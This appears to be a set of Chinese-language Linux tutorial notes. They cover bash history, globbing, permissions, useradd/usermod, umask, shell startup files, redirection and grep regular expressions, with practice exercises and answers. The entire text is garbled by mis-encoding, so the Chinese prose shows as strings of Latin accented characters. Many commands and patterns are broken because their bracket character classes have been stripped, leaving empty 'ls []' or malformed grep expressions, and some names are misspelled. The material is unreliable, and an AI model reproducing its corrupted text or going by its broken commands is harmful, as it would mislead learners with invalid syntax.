æ¸…å±å‘½ä»¤å†å²ï¼šæŸ¥çœ‹å‘½ä»¤å†å²ï¼šhistory-cï¼šæ¸…ç©ºå‘½ä»¤å†å²-d OFFSET : åˆ é™¤æŒ‡å®šä½ç½®çš„å‘½ä»¤-wï¼šä¿å­˜å‘½ä»¤å†å²è‡³å†å²æ–‡ä»¶ä¸­ç¯å¢ƒå˜é‡PATHï¼šå‘½ä»¤æœç´¢è·¯å¾„HISTSIZE: å‘½ä»¤å†å²ç¼“å†²åŒºå¤§å°å‘½ä»¤å†å²çš„ä½¿ç”¨æŠ€å·§ï¼š!nï¼šæ‰§è¡Œå‘½ä»¤å†å²ä¸­çš„ç¬¬næ¡å‘½ä»¤ï¼›!-n:æ‰§è¡Œå‘½ä»¤å†å²ä¸­çš„å€’æ•°ç¬¬næ¡å‘½ä»¤ï¼›!!: æ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤ï¼›!stringï¼šæ‰§è¡Œå‘½ä»¤å†å²ä¸­æœ€è¿‘ä¸€ä¸ªä»¥æŒ‡å®šå­—ç¬¦ä¸²å¼€å¤´çš„å‘½ä»¤!$:å¼•ç”¨å‰ä¸€ä¸ªå‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°;Esc, .Alt+.å‘½ä»¤è¡¥å…¨ï¼šPATH:è·¯å¾„è¡¥å…¨ï¼šæ–‡æœ¬ç›¸å…³çš„å‘½ä»¤æŸ¥çœ‹ï¼šcat, tac, more, less, head, tailç»Ÿè®¡ï¼šwcå¤„ç†ï¼štr, cut, joinæ’åºï¼šsortuniqbashç‰¹æ€§ï¼šå‘½ä»¤è¡Œç¼–è¾‘ï¼šå‘½ä»¤å†å²ï¼šhistory-c-w-dHISTSIZE~/.bash_history!n, !-n, !!, !string, !$å‘½ä»¤è¡¥å…¨ï¼Œè·¯å¾„è¡¥å…¨å‘½ä»¤è¡¥å…¨ï¼šæœç´¢PATHç¯å¢ƒå˜é‡æ‰€æŒ‡å®šçš„æ¯ä¸ªè·¯å¾„ä¸‹ä»¥æˆ‘ä»¬ç»™å‡ºçš„å­—ç¬¦ä¸²å¼€å¤´çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚æœå¤šäºä¸€ä¸ªï¼Œä¸¤æ¬¡tabï¼Œå¯ä»¥ç»™å‡ºåˆ—è¡¨ï¼›å¦åˆ™å°†ç›´æ¥è¡¥å…¨ï¼›è·¯å¾„è¡¥å…¨ï¼šæœç´¢æˆ‘ä»¬ç»™å‡ºçš„èµ·å§‹è·¯å¾„ä¸‹çš„æ¯ä¸ªæ–‡ä»¶åï¼Œå¹¶è¯•å›¾è¡¥å…¨ï¼›å‘½ä»¤åˆ«åalias CMDALIAS='COMMAND â€™åœ¨shellä¸­å®šä¹‰çš„åˆ«åä»…åœ¨å½“å‰shellç”Ÿå‘½å‘¨æœŸä¸­æœ‰æ•ˆï¼›åˆ«åçš„æœ‰æ•ˆèŒƒå›´ä»…ä¸ºå½“å‰shellè¿›ç¨‹ï¼›ualias CMDALIAS\\CMDå‘½ä»¤æ›¿æ¢: $(COMMAND), åå¼•å·ï¼šCOMMANDæŠŠå‘½ä»¤ä¸­æŸä¸ªå­å‘½ä»¤æ›¿æ¢ä¸ºå…¶æ‰§è¡Œç»“æœçš„è¿‡ç¨‹file-2013-02-28-14-53-31.txtbashæ”¯æŒçš„å¼•å·ï¼š``: å‘½ä»¤æ›¿æ¢â€œâ€: å¼±å¼•ç”¨ï¼Œå¯ä»¥å®ç°å˜é‡æ›¿æ¢â€˜â€™: å¼ºå¼•ç”¨ï¼Œä¸å®Œæˆå˜é‡æ›¿æ¢æ–‡ä»¶åé€šé…, globbing*: ä»»æ„é•¿åº¦çš„ä»»æ„å­—ç¬¦?ï¼šä»»æ„å•ä¸ªå­—ç¬¦[]ï¼šåŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å•ä¸ªå­—ç¬¦, , , , , ,ï¼šç©ºç™½å­—ç¬¦ï¼šæ ‡ç‚¹ç¬¦å·ï¼šå°å†™å­—æ¯: å¤§å†™å­—æ¯: å¤§å°å†™å­—æ¯: æ•°å­—: æ•°å­—å’Œå¤§å°å†™å­—æ¯ man 7 glob: åŒ¹é…æŒ‡å®šèŒƒå›´ä¹‹å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦[][][^]ç»ƒä¹ ï¼š1ã€åˆ›å»ºa123, cd6, c78m, c1 my, m.z, k 67, 8yu, 789ç­‰æ–‡ä»¶ï¼›æ³¨æ„ï¼Œä»¥ä¸Šæ–‡ä»¶æ˜¯ä»¥é€—å·éš”å¼€çš„ï¼Œå…¶å®ƒç¬¦å·éƒ½æ˜¯æ–‡ä»¶åçš„ç»„æˆéƒ¨åˆ†ï¼›2ã€æ˜¾ç¤ºæ‰€æœ‰ä»¥aæˆ–må¼€å¤´çš„æ–‡ä»¶ï¼›ls *3ã€æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶åä¸­åŒ…å«äº†æ•°å­—çš„æ–‡ä»¶ï¼›ls **ls []4ã€æ˜¾ç¤ºæ‰€æœ‰ä»¥æ•°å­—ç»“å°¾ä¸”æ–‡ä»¶åä¸­ä¸åŒ…å«ç©ºç™½çš„æ–‡ä»¶ï¼›ls [^] ???5ã€æ˜¾ç¤ºæ–‡ä»¶åä¸­åŒ…å«äº†éå­—æ¯æˆ–æ•°å­—çš„ç‰¹æ®Šç¬¦å·çš„æ–‡ä»¶ï¼›ls [^]ç”¨æˆ·ã€ç»„ã€æƒé™å®‰å…¨ä¸Šä¸‹æ–‡(secure context)ï¼šæƒé™ï¼šr, w, xæ–‡ä»¶ï¼šrï¼šå¯è¯»ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼catç­‰å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼›wï¼šå¯å†™ï¼Œå¯ä»¥ç¼–è¾‘æˆ–åˆ é™¤æ­¤æ–‡ä»¶ï¼›x: å¯æ‰§è¡Œï¼ŒeXacutableï¼Œå¯ä»¥å‘½ä»¤æç¤ºç¬¦ä¸‹å½“ä½œå‘½ä»¤æäº¤ç»™å†…æ ¸è¿è¡Œï¼›ç›®å½•ï¼šr: å¯ä»¥å¯¹æ­¤ç›®å½•æ‰§è¡Œlsä»¥åˆ—å‡ºå†…éƒ¨çš„æ‰€æœ‰æ–‡ä»¶ï¼›w: å¯ä»¥åœ¨æ­¤ç›®å½•åˆ›å»ºæ–‡ä»¶ï¼›x: å¯ä»¥ä½¿ç”¨cdåˆ‡æ¢è¿›æ­¤ç›®å½•ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ls -læŸ¥çœ‹å†…éƒ¨æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼›rwx:râ€“:åªè¯»r-x:è¯»å’Œæ‰§è¡Œâ€”ï¼šæ— æƒé™0 000 â€”ï¼šæ— æƒé™1 001 --x: æ‰§è¡Œ2 010 -w-: å†™3 011 -wx: å†™å’Œæ‰§è¡Œ4 100 râ€“: åªè¯»5 101 r-x: è¯»å’Œæ‰§è¡Œ6 110 rw-: è¯»å†™7 111 rwx: è¯»å†™æ‰§è¡Œ755ï¼šrwxr-xr-xrw-r-----: 640660:rw-rw----rwxrwxr-x:775ç”¨æˆ·ï¼šUID, /etc/passwdç»„ï¼šGID, /etc/groupå½±å­å£ä»¤ï¼šç”¨æˆ·ï¼š/etc/shadowç»„ï¼š/etc/gshadowç”¨æˆ·ç±»åˆ«ï¼šç®¡ç†å‘˜ï¼š0æ™®é€šç”¨æˆ·ï¼š 1-65535ç³»ç»Ÿç”¨æˆ·ï¼š1-499ä¸€èˆ¬ç”¨æˆ·ï¼š500-60000ç”¨æˆ·ç»„ç±»åˆ«ï¼šç®¡ç†å‘˜ç»„ï¼šæ™®é€šç»„ï¼šç³»ç»Ÿç»„ï¼šä¸€èˆ¬ç»„ï¼šç”¨æˆ·ç»„ç±»åˆ«ï¼šç§æœ‰ç»„ï¼šåˆ›å»ºç”¨æˆ·æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¸ºå…¶æŒ‡å®šæ‰€å±çš„ç»„ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ä¸ºå…¶åˆ›å»ºä¸€ä¸ªä¸ç”¨æˆ·ååŒåçš„ç»„åŸºæœ¬ç»„ï¼šç”¨æˆ·çš„é»˜è®¤ç»„é™„åŠ ç»„ï¼Œé¢å¤–ç»„ï¼šé»˜è®¤ç»„ä»¥å¤–çš„å…¶å®ƒç»„è¿›ç¨‹ï¼štom tomå¯¹è±¡ï¼šrwxrw-r-- jerry tom a.txttom: lsrwxr-xr-x root root /bin/lsls/etc/passwdaccount: ç™»å½•åpassword: å¯†ç UIDï¼šGIDï¼šåŸºæœ¬ç»„IDcomment: æ³¨é‡ŠHOME DIRï¼šå®¶ç›®å½•SHELLï¼šç”¨æˆ·çš„é»˜è®¤shell/etc/shadowaccount: ç™»å½•åencrypted password: åŠ å¯†çš„å¯†ç åŠ å¯†æ–¹æ³•ï¼šå¯¹ç§°åŠ å¯†ï¼šåŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒä¸€ä¸ªå¯†ç å…¬é’¥åŠ å¯†ï¼šæ¯ä¸ªå¯†ç éƒ½æˆå¯¹å„¿å‡ºç°ï¼Œä¸€ä¸ªä¸ºç§é’¥(secret key)ï¼Œä¸€ä¸ªä¸ºå…¬é’¥(public key)å•å‘åŠ å¯†ï¼Œæ•£åˆ—åŠ å¯†ï¼šæå–æ•°æ®ç‰¹å¾ç ï¼Œå¸¸ç”¨äºæ•°æ®å®Œæ•´æ€§æ ¡éªŒ1ã€é›ªå´©æ•ˆåº”2ã€å®šé•¿è¾“å‡ºMD5ï¼šMessage Digest, 128ä½å®šé•¿è¾“å‡ºSHA1ï¼šSecure Hash Algorithm, 160ä½å®šé•¿è¾“å‡ºuseradd USERNAMEgroupadd GRPNAMEç”¨æˆ·ç®¡ç†ï¼šuseradd, userdel, usermod, passwd, chsh, chfn, finger, id, chageç»„ç®¡ç†ï¼šgroupadd, groupdel, groupmod, gpasswdæƒé™ç®¡ç†ï¼šchown, chgrp, chmod, umask/etc/passwd:ç”¨æˆ·åï¼šå¯†ç ï¼šUID:GIDï¼šæ³¨é‡Šï¼šå®¶ç›®å½•ï¼šé»˜è®¤SHELL/etc/group:ç»„åï¼šå¯†ç ï¼šGID:ä»¥æ­¤ç»„ä¸ºå…¶é™„åŠ ç»„çš„ç”¨æˆ·åˆ—è¡¨/etc/shadowï¼šç”¨æˆ·åï¼šå¯†ç ï¼šæœ€è¿‘ä¸€æ¬¡ä¿®æ”¹å¯†ç çš„æ—¶é—´ï¼šæœ€çŸ­ä½¿ç”¨æœŸé™ï¼šæœ€é•¿ä½¿ç”¨æœŸé™ï¼šè­¦å‘Šæ—¶é—´ï¼šéæ´»åŠ¨æ—¶é—´ï¼šè¿‡æœŸæ—¶é—´ï¼šç”¨æˆ·ç®¡ç†ï¼šuseradd, userdel, usermod, passwd, chsh, chfn, finger, id, chageuseradd USERNAME-u UID-g GIDï¼ˆåŸºæœ¬ç»„ï¼‰-G GID,â€¦ ï¼ˆé™„åŠ ç»„ï¼‰-c â€œCOMMENTâ€-d /path/to/directory-s SHELL-m -k-M-r: æ·»åŠ ç³»ç»Ÿç”¨æˆ·/etc/login.defsç¯å¢ƒå˜é‡ï¼šPATHHISTSIZESHELL/etc/shellsï¼šæŒ‡å®šäº†å½“å‰ç³»ç»Ÿå¯ç”¨çš„å®‰å…¨shelluserdel:userdel USERNAME-r: åŒæ—¶åˆ é™¤ç”¨æˆ·çš„å®¶ç›®å½•idï¼šæŸ¥çœ‹ç”¨æˆ·çš„å¸å·å±æ€§ä¿¡æ¯-u-g-G-nfinger: æŸ¥çœ‹ç”¨æˆ·å¸å·ä¿¡æ¯finger USERNAMEä¿®æ”¹ç”¨æˆ·å¸å·å±æ€§ï¼šusermod-u UID-g GID-a -G GIDï¼šä¸ä½¿ç”¨-aé€‰é¡¹ï¼Œä¼šè¦†ç›–æ­¤å‰çš„é™„åŠ ç»„ï¼›-c-d -mï¼š-s-l-Lï¼šé”å®šå¸å·-Uï¼šè§£é”å¸å·chsh: ä¿®æ”¹ç”¨æˆ·çš„é»˜è®¤shellchfnï¼šä¿®æ”¹æ³¨é‡Šä¿¡æ¯å¯†ç ç®¡ç†ï¼špasswdâ€“stdin-l-u-d: åˆ é™¤ç”¨æˆ·å¯†ç pwckï¼šæ£€æŸ¥ç”¨æˆ·å¸å·å®Œæ•´æ€§ç»„ç®¡ç†ï¼šåˆ›å»ºç»„:groupaddgroupadd-g GID-rï¼šæ·»åŠ ä¸ºç³»ç»Ÿç»„groupmod-g GID-n GRPNAMEgroupdelgpasswdï¼šä¸ºç»„è®¾å®šå¯†ç newgrp GRPNAME &lt;â€“&gt; exitç»ƒä¹ ï¼š1ã€åˆ›å»ºä¸€ä¸ªç”¨æˆ·mandrivaï¼Œå…¶IDå·ä¸º2002ï¼ŒåŸºæœ¬ç»„ä¸ºdistroï¼ˆç»„IDä¸º3003ï¼‰ï¼Œé™„åŠ ç»„ä¸ºlinuxï¼› groupadd -g 3003 distro groupadd linux useradd -u 2002 -g distro -G linux mandriva2ã€åˆ›å»ºä¸€ä¸ªç”¨æˆ·fedoraï¼Œå…¶å…¨åä¸ºFedora Communityï¼Œé»˜è®¤shellä¸ºtcshï¼› useradd -c â€œFedora Communityâ€ -s /bin/tcsh fedora3ã€ä¿®æ”¹mandrivaçš„IDå·ä¸º4004ï¼ŒåŸºæœ¬ç»„ä¸ºlinuxï¼Œé™„åŠ ç»„ä¸ºdistroå’Œfedoraï¼› usermod -u 4004 -g linux -G distro,fedora mandriva4ã€ç»™fedoraåŠ å¯†ç ï¼Œå¹¶è®¾å®šå…¶å¯†ç æœ€çŸ­ä½¿ç”¨æœŸé™ä¸º2å¤©ï¼Œæœ€é•¿ä¸º50å¤©ï¼› passwd -n 2 -x 50 fedora5ã€å°†mandrivaçš„é»˜è®¤shellæ”¹ä¸º/bin/bash;usermod -s /bin/bash mandirva6ã€æ·»åŠ ç³»ç»Ÿç”¨æˆ·hbaseï¼Œä¸”ä¸å…è®¸å…¶ç™»å½•ç³»ç»Ÿï¼› useradd -r -s /sbin/nologin hbase7ã€chage-d: æœ€è¿‘ä¸€æ¬¡çš„ä¿®æ”¹æ—¶é—´-E: è¿‡æœŸæ—¶é—´-Iï¼šéæ´»åŠ¨æ—¶é—´-m: æœ€çŸ­ä½¿ç”¨æœŸé™-M: æœ€é•¿ä½¿ç”¨æœŸé™-W: è­¦å‘Šæ—¶é—´æƒé™ç®¡ç†ï¼šr:wï¼šxï¼šä¸‰ç±»ç”¨æˆ·ï¼šu: å±ä¸»g: å±ç»„o: å…¶å®ƒç”¨æˆ·chown: æ”¹å˜æ–‡ä»¶å±ä¸»(åªæœ‰ç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤) chown USERNAME file,â€¦-R: ä¿®æ”¹ç›®å½•åŠå…¶å†…éƒ¨æ–‡ä»¶çš„å±ä¸» --reference=/path/to/somefile file,... chown USERNAME:GRPNAME file,â€¦chown USERNAME.GRPNAME file,â€¦ chgrp GRPNAME file,â€¦-R --reference=/path/to/somefile file,... chmod: ä¿®æ”¹æ–‡ä»¶çš„æƒé™ä¿®æ”¹ä¸‰ç±»ç”¨æˆ·çš„æƒé™ï¼šchmod MODE file,â€¦-Râ€“reference=/path/to/somefile file,â€¦rwxr-xâ€”ä¿®æ”¹æŸç±»ç”¨æˆ·æˆ–æŸäº›ç±»ç”¨æˆ·æƒé™ï¼šu,g,o,achmod ç”¨æˆ·ç±»åˆ«=MODE file,â€¦ä¿®æ”¹æŸç±»ç”¨æˆ·çš„æŸä½æˆ–æŸäº›ä½æƒé™ï¼šu,g,o,achmod ç”¨æˆ·ç±»åˆ«+|-MODE file,â€¦ç»ƒä¹ ï¼š1ã€æ–°å»ºä¸€ä¸ªæ²¡æœ‰å®¶ç›®å½•çš„ç”¨æˆ·openstackï¼› useradd -M openstack2ã€å¤åˆ¶/etc/skelä¸º/home/openstackï¼› cp -r /etc/skel /home/openstack3ã€æ”¹å˜/home/openstackåŠå…¶å†…éƒ¨æ–‡ä»¶çš„å±ä¸»å±ç»„å‡ä¸ºopenstackï¼› chown -R openstack:openstack /home/openstack4ã€/home/openstackåŠå…¶å†…éƒ¨çš„æ–‡ä»¶ï¼Œå±ç»„å’Œå…¶å®ƒç”¨æˆ·æ²¡æœ‰ä»»ä½•è®¿é—®æƒé™ chmod -R go= /home/openstacksu - openstackæ‰‹åŠ¨æ·»åŠ ç”¨æˆ·hive, åŸºæœ¬ç»„ä¸ºhive (5000)ï¼Œé™„åŠ ç»„ä¸ºmygroupumaskï¼šé®ç½©ç 666-umask777-umask umask umask 022æ–‡ä»¶é»˜è®¤ä¸èƒ½å…·æœ‰æ‰§è¡Œæƒé™ï¼Œå¦‚æœç®—å¾—çš„ç»“æœä¸­æœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™å°†å…¶æƒé™åŠ 1ï¼›umask: 023æ–‡ä»¶ï¼š666-023=643 Xç›®å½•ï¼š777-023=754ç«™åœ¨ç”¨æˆ·ç™»å½•çš„è§’åº¦æ¥è¯´ï¼ŒSHELLçš„ç±»å‹ï¼šç™»å½•å¼shell:æ­£å¸¸é€šå¸¸æŸç»ˆç«¯ç™»å½•su - USERNAMEsu -l USERNAMEéç™»å½•å¼shell:su USERNAMEå›¾å½¢ç»ˆç«¯ä¸‹æ‰“å¼€å‘½ä»¤çª—å£è‡ªåŠ¨æ‰§è¡Œçš„shellè„šæœ¬bashçš„é…ç½®æ–‡ä»¶ï¼šå…¨å±€é…ç½®/etc/profile, /etc/profile.d/*.sh, /etc/bashrcä¸ªäººé…ç½®~/.bash_profile, ~/.bashrcprofileç±»çš„æ–‡ä»¶ï¼šè®¾å®šç¯å¢ƒå˜é‡è¿è¡Œå‘½ä»¤æˆ–è„šæœ¬bashrcç±»çš„æ–‡ä»¶ï¼šè®¾å®šæœ¬åœ°å˜é‡å®šä¹‰å‘½ä»¤åˆ«åç™»å½•å¼shellå¦‚ä½•è¯»å–é…ç½®æ–‡ä»¶ï¼Ÿ/etc/profile --&gt; /etc/profile.d/*.sh --&gt; ~/.bash_profile --&gt; ~/.bashrc --&gt; /etc/bashrcéç™»å½•å¼shellå¦‚ä½•é…ç½®æ–‡ä»¶?~/.bashrc --&gt; /etc/basrc --&gt; /etc/profile.d/*.shbash: è„šæœ¬è§£é‡Šå™¨å§“åï¼Œæ¥è‡ªåœ°åŒºï¼Œæ€§æ ¼ã€çˆ±å¥½å’Œç‰¹é•¿ï¼Œä¸ªäººå¯„è¯­ç™»å½•å¼shellï¼Œé…ç½®æ–‡ä»¶åŠæ¬¡åºï¼š/etc/profile --&gt; /etc/profile.d/*.sh --&gt; ~/.bash_profile --&gt; ~/.bashrc --&gt; /etc/bashrcéç™»å½•å¼shellï¼š~/.bashrc --&gt; /etc/bashrc --&gt; /etc/profile.d/*.shprofile: å®šä¹‰ç¯å¢ƒå˜é‡ã€è¿è¡Œç¨‹åºæˆ–è„šæœ¬bashrcï¼šå®šä¹‰æœ¬åœ°å˜é‡ã€å‘½ä»¤åˆ«åchown, chgrp, chmod-Râ€“reference=chmod:perm: 777ï¼Œ 666u,g,o,a =u,g,o,a +/-umaskç®¡é“å’Œé‡å®šå‘ï¼š&gt; &lt; &gt;&gt; &lt;&lt;è¿ç®—å™¨ã€æ§åˆ¶å™¨ï¼š CPUå­˜å‚¨å™¨ï¼šRAMè¾“å…¥è®¾å¤‡/è¾“å‡ºè®¾å¤‡ç¨‹åºï¼šæŒ‡ä»¤å’Œæ•°æ®æ§åˆ¶å™¨ï¼šæŒ‡ä»¤è¿ç®—å™¨ï¼šå­˜å‚¨å™¨ï¼šåœ°å€æ€»çº¿ï¼šå†…å­˜å¯»å€æ•°æ®æ€»çº¿ï¼šä¼ è¾“æ•°æ®æ§åˆ¶æ€»ç»“ï¼šæ§åˆ¶æŒ‡ä»¤å¯„å­˜å™¨ï¼šCPUæš‚æ—¶å­˜å‚¨å™¨I/O: ç¡¬ç›˜ï¼Œç¨‹åºINPUTè®¾å¤‡ï¼šOUTPUTè®¾å¤‡ç³»ç»Ÿè®¾å®šé»˜è®¤è¾“å‡ºè®¾å¤‡ï¼šæ ‡å‡†è¾“å‡ºï¼ŒSTDOUT, 1é»˜è®¤è¾“å…¥è®¾å¤‡ï¼šæ ‡å‡†è¾“å…¥, STDIN, 0æ ‡å‡†é”™è¯¯è¾“å‡ºï¼šSTDERR, 2æ ‡å‡†è¾“å…¥ï¼šé”®ç›˜æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºï¼šæ˜¾ç¤ºå™¨I/Oé‡å®šå‘ï¼šLinux:: è¦†ç›–è¾“å‡ºï¼šè¿½åŠ è¾“å‡ºset -C: ç¦æ­¢å¯¹å·²ç»å­˜åœ¨æ–‡ä»¶ä½¿ç”¨è¦†ç›–é‡å®šå‘ï¼›å¼ºåˆ¶è¦†ç›–è¾“å‡ºï¼Œåˆ™ä½¿ç”¨ &gt;|set +C: å…³é—­ä¸Šè¿°åŠŸèƒ½2&gt;: é‡å®šå‘é”™è¯¯è¾“å‡º2&gt;&gt;: è¿½åŠ æ–¹å¼&amp;&gt;: é‡å®šå‘æ ‡å‡†è¾“å‡ºæˆ–é”™è¯¯è¾“å‡ºè‡³åŒä¸€ä¸ªæ–‡ä»¶&lt;ï¼šè¾“å…¥é‡å®šå‘&lt;&lt;ï¼šHere Documentç®¡é“ï¼šå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥å‘½ä»¤1 | å‘½ä»¤2 | å‘½ä»¤3 | â€¦ç»ƒä¹ ï¼š1ã€ç»Ÿè®¡/usr/bin/ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸ªæ•°ï¼› ls /usr/bin | wc -l2ã€å–å‡ºå½“å‰ç³»ç»Ÿä¸Šæ‰€æœ‰ç”¨æˆ·çš„shellï¼Œè¦æ±‚ï¼Œæ¯ç§shellåªæ˜¾ç¤ºä¸€æ¬¡ï¼Œå¹¶ä¸”æŒ‰é¡ºåºè¿›è¡Œæ˜¾ç¤ºï¼› cut -d: -f7 /etc/passwd | sort -u3ã€æ€è€ƒï¼šå¦‚ä½•æ˜¾ç¤º/var/logç›®å½•ä¸‹æ¯ä¸ªæ–‡ä»¶çš„å†…å®¹ç±»å‹ï¼Ÿ4ã€å–å‡º/etc/inittabæ–‡ä»¶çš„ç¬¬6è¡Œï¼› head -6 /etc/inittab | tail -15ã€å–å‡º/etc/passwdæ–‡ä»¶ä¸­å€’æ•°ç¬¬9ä¸ªç”¨æˆ·çš„ç”¨æˆ·åå’Œshellï¼Œæ˜¾ç¤ºåˆ°å±å¹•ä¸Šå¹¶å°†å…¶ä¿å­˜è‡³/tmp/usersæ–‡ä»¶ä¸­ï¼› tail -9 /etc/passwd | head -1 | cut -d: -f1,7 | tee /tmp/users6ã€æ˜¾ç¤º/etcç›®å½•ä¸‹æ‰€æœ‰ä»¥paå¼€å¤´çš„æ–‡ä»¶ï¼Œå¹¶ç»Ÿè®¡å…¶ä¸ªæ•°ï¼› ls -d /etc/pa* | wc -l7ã€ä¸ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå°†alias cls=clearä¸€è¡Œå†…å®¹æ·»åŠ è‡³å½“å‰ç”¨æˆ·çš„.bashrcæ–‡ä»¶ä¸­ï¼› echo â€œalias cls=clearâ€ &gt;&gt; ~/.bashrcgrep, egrep, fgrepgrep: æ ¹æ®æ¨¡å¼æœç´¢æ–‡æœ¬ï¼Œå¹¶å°†ç¬¦åˆæ¨¡å¼çš„æ–‡æœ¬è¡Œæ˜¾ç¤ºå‡ºæ¥ã€‚Pattern: æ–‡æœ¬å­—ç¬¦å’Œæ­£åˆ™è¡¨è¾¾å¼çš„å…ƒå­—ç¬¦ç»„åˆè€ŒæˆåŒ¹é…æ¡ä»¶grep PATTERN-iâ€“color-v: æ˜¾ç¤ºæ²¡æœ‰è¢«æ¨¡å¼åŒ¹é…åˆ°çš„è¡Œ-oï¼šåªæ˜¾ç¤ºè¢«æ¨¡å¼åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²*: ä»»æ„é•¿åº¦çš„ä»»æ„å­—ç¬¦?: ä»»æ„å•ä¸ªå­—ç¬¦[]::æ­£åˆ™è¡¨è¾¾å¼ï¼šREGular EXPression, REGEXPå…ƒå­—ç¬¦ï¼š.: åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦[]: åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å•ä¸ªå­—ç¬¦ï¼šåŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦å­—ç¬¦é›†åˆï¼š, , , , , ,åŒ¹é…æ¬¡æ•°ï¼ˆè´ªå©ªæ¨¡å¼ï¼‰ï¼š: åŒ¹é…å…¶å‰é¢çš„å­—ç¬¦ä»»æ„æ¬¡a, b, ab, aab, acb, adb, amnbabï¼Œ a?ba.*b.*: ä»»æ„é•¿åº¦çš„ä»»æ„å­—ç¬¦ ?: åŒ¹é…å…¶å‰é¢çš„å­—ç¬¦1æ¬¡æˆ–0æ¬¡{m,n}:åŒ¹é…å…¶å‰é¢çš„å­—ç¬¦è‡³å°‘mæ¬¡ï¼Œè‡³å¤šnæ¬¡{1,}{0,3}ä½ç½®é”šå®šï¼š^: é”šå®šè¡Œé¦–ï¼Œæ­¤å­—ç¬¦åé¢çš„ä»»æ„å†…å®¹å¿…é¡»å‡ºç°åœ¨è¡Œé¦–: é”šå®šè¡Œå°¾ï¼Œæ­¤å­—ç¬¦å‰é¢çš„ä»»æ„å†…å®¹å¿…é¡»å‡ºç°åœ¨è¡Œå°¾ ^: ç©ºç™½è¡Œ&lt;æˆ–\\b: é”šå®šè¯é¦–ï¼Œå…¶åé¢çš„ä»»æ„å­—ç¬¦å¿…é¡»ä½œä¸ºå•è¯é¦–éƒ¨å‡ºç°&gt;æˆ–\\b: é”šå®šè¯å°¾ï¼Œå…¶å‰é¢çš„ä»»æ„å­—ç¬¦å¿…é¡»ä½œä¸ºå•è¯çš„å°¾éƒ¨å‡ºç°åˆ†ç»„ï¼š()(ab)*åå‘å¼•ç”¨\\1: å¼•ç”¨ç¬¬ä¸€ä¸ªå·¦æ‹¬å·ä»¥åŠä¸ä¹‹å¯¹åº”çš„å³æ‹¬å·æ‰€åŒ…æ‹¬çš„æ‰€æœ‰å†…å®¹\\2:\\3:He love his lover.She like her liker.He like his lover.lâ€¦eç»ƒä¹ ï¼š1ã€æ˜¾ç¤º/proc/meminfoæ–‡ä»¶ä¸­ä»¥ä¸åŒºåˆ†å¤§å°çš„så¼€å¤´çš„è¡Œï¼›grep -i â€˜^sâ€™ /proc/meminfogrep â€˜^â€™ /proc/meminfo2ã€æ˜¾ç¤º/etc/passwdä¸­ä»¥nologinç»“å°¾çš„è¡Œ;grep â€˜nologin$â€™ /etc/passwdå–å‡ºé»˜è®¤shellä¸º/sbin/nologinçš„ç”¨æˆ·åˆ—è¡¨grep &quot;nologin$â€™ /etc/passwd | cut -d: -f1å–å‡ºé»˜è®¤shellä¸ºbashï¼Œä¸”å…¶ç”¨æˆ·IDå·æœ€å°çš„ç”¨æˆ·çš„ç”¨æˆ·ågrep â€˜bash$â€™ /etc/passwd | sort -n -t: -k3 | head -1 | cut -d: -f13ã€æ˜¾ç¤º/etc/inittabä¸­ä»¥#å¼€å¤´ï¼Œä¸”åé¢è·Ÿä¸€ä¸ªæˆ–å¤šä¸ªç©ºç™½å­—ç¬¦ï¼Œè€Œååˆè·Ÿäº†ä»»æ„éç©ºç™½å­—ç¬¦çš„è¡Œï¼›grep â€œ#[]{1,}[]â€ /etc/inittab4ã€æ˜¾ç¤º/etc/inittabä¸­åŒ…å«äº†:ä¸€ä¸ªæ•°å­—:(å³ä¸¤ä¸ªå†’å·ä¸­é—´ä¸€ä¸ªæ•°å­—)çš„è¡Œï¼›grep â€˜::â€™ /etc/inittab5ã€æ˜¾ç¤º/boot/grub/grub.confæ–‡ä»¶ä¸­ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªç©ºç™½å­—ç¬¦å¼€å¤´çš„è¡Œï¼›grep â€˜[1]{1,}â€™ /boot/grub/grub.conf6ã€æ˜¾ç¤º/etc/inittabæ–‡ä»¶ä¸­ä»¥ä¸€ä¸ªæ•°å­—å¼€å¤´å¹¶ä»¥ä¸€ä¸ªä¸å¼€å¤´æ•°å­—ç›¸åŒçš„æ•°å­—ç»“å°¾çš„è¡Œï¼›grep â€˜^().*\\1$â€™ /etc/inittabç»ƒä¹ ï¼š1ã€æ‰¾å‡ºæŸæ–‡ä»¶ä¸­çš„ï¼Œ1ä½æ•°ï¼Œæˆ–2ä½æ•°ï¼›grep â€˜{1,2}â€™ /proc/cpuinfogrep --color â€˜&lt;{1,2}&gt;â€™ /proc/cpuinfo2ã€æ‰¾å‡ºifconfigå‘½ä»¤ç»“æœä¸­çš„1-255ä¹‹é—´çš„æ•´æ•°ï¼›3ã€æŸ¥æ‰¾å½“å‰ç³»ç»Ÿä¸Šåå­—ä¸ºstudent(å¿…é¡»å‡ºç°åœ¨è¡Œé¦–)çš„ç”¨æˆ·çš„å¸å·çš„ç›¸å…³ä¿¡æ¯, æ–‡ä»¶ä¸º/etc/passwdgrep â€˜^student&gt;â€™ /etc/passwd | cut -d: -f3id -u studentstudent1student2ç»ƒä¹ 